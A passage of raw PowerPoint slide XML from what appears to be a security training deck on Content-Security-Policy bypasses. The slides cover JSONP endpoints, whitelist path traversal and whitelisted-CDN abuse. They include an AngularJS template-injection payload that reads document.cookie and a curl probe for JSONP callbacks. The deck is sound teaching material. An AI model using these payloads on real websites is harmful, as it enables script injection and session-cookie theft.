            <a:off x="7599521" y="2133719"/>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3. JSONP Endpoints</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7599521" y="2785824"/>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VULNERABLE: script-src 'self' https://api.example.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7599521" y="3368040"/>
            <a:ext cx="6244709" cy="362903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>If api.example.com has JSONP endpoints</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7599521" y="4099474"/>
            <a:ext cx="6244709" cy="35957"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2B4150">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7599521" y="4390549"/>
            <a:ext cx="4841200" cy="425291"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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4. Path Traversal in Whitelists</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7599521" y="5042654"/>
            <a:ext cx="6244709" cy="37814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Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>❌</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> WEAK: script-src 'self' https://trusted.com/scripts/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7599521" y="5624870"/>
            <a:ext cx="6244709" cy="362903"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>If trusted.com allows file uploads anywhere</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89102" y="503634"/>
            <a:ext cx="7269242" cy="536734"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="325F7B"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5. Common CSP Bypass Techniques</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1389102" y="1092398"/>
            <a:ext cx="5913001" cy="429339"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3350"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technique 1: Whitelisted CDN Abuse</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1389102" y="1863090"/>
            <a:ext cx="5716429" cy="5716429"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7532251" y="1863090"/>
            <a:ext cx="2793206" cy="1739979"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1481"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7703939" y="2034778"/>
            <a:ext cx="2147054" cy="268248"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7703939" y="2449354"/>
            <a:ext cx="2449830" cy="982028"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2624"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7695367" y="2449354"/>
            <a:ext cx="2466975" cy="982028"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2624"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7867055" y="2578179"/>
            <a:ext cx="2123599" cy="724376"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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script-src 'self' https://cdnjs.cloudflare.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10455473" y="1863090"/>
            <a:ext cx="2793206" cy="1739979"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1481"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10627162" y="2034778"/>
            <a:ext cx="2147054" cy="268248"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10627162" y="2449354"/>
            <a:ext cx="2449830" cy="982028"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2624"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10618589" y="2449354"/>
            <a:ext cx="2466975" cy="982028"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2624"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10790277" y="2578179"/>
            <a:ext cx="2123599" cy="724376"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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{{constructor.constructor('alert(document.cookie)')()}}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7532251" y="3733086"/>
            <a:ext cx="5716429" cy="1556980"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1655"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7703939" y="3904774"/>
            <a:ext cx="2147054" cy="268248"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2100"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7703939" y="4303038"/>
            <a:ext cx="5373053" cy="724433"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>AngularJS whitelisted via CDN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>AngularJS evaluates {{ }} expressions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1900"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Bypasses CSP as script is from trusted source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9140" y="697825"/>
            <a:ext cx="8538567" cy="527804"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technique 2: JSONP Endpoint Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="739140" y="1618774"/>
            <a:ext cx="6477714" cy="2314337"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1369"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="22860">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="973098" y="1852732"/>
            <a:ext cx="2639735" cy="329922"/>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MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="973098" y="2403753"/>
            <a:ext cx="6009799" cy="969169"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3269"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="962620" y="2403753"/>
            <a:ext cx="6030754" cy="969169"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3269"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1173718" y="2562106"/>
            <a:ext cx="5608558" cy="652462"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="255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Content-Security-Policy: script-src 'self' https://api.example.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7413427" y="1618774"/>
            <a:ext cx="6477833" cy="2314337"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1369"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFCF5"/>
          </a:solidFill>
          <a:ln w="22860">
            <a:solidFill>
              <a:srgbClr val="D9D4C9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7647384" y="1852732"/>
            <a:ext cx="3310771" cy="329922"/>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MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Finding JSONP Endpoints:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7647384" y="2403753"/>
            <a:ext cx="6009918" cy="1295400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2445"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7636907" y="2403753"/>
            <a:ext cx="6030873" cy="1295400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2445"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7848005" y="2562106"/>
            <a:ext cx="5608677" cy="978694"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="255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Test for JSONP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="255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curl "https://api.example.com/user?callback=test"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="255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Response: test({"user":"admin","role":"admin"})</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="739140" y="4228028"/>
            <a:ext cx="2639735" cy="329922"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
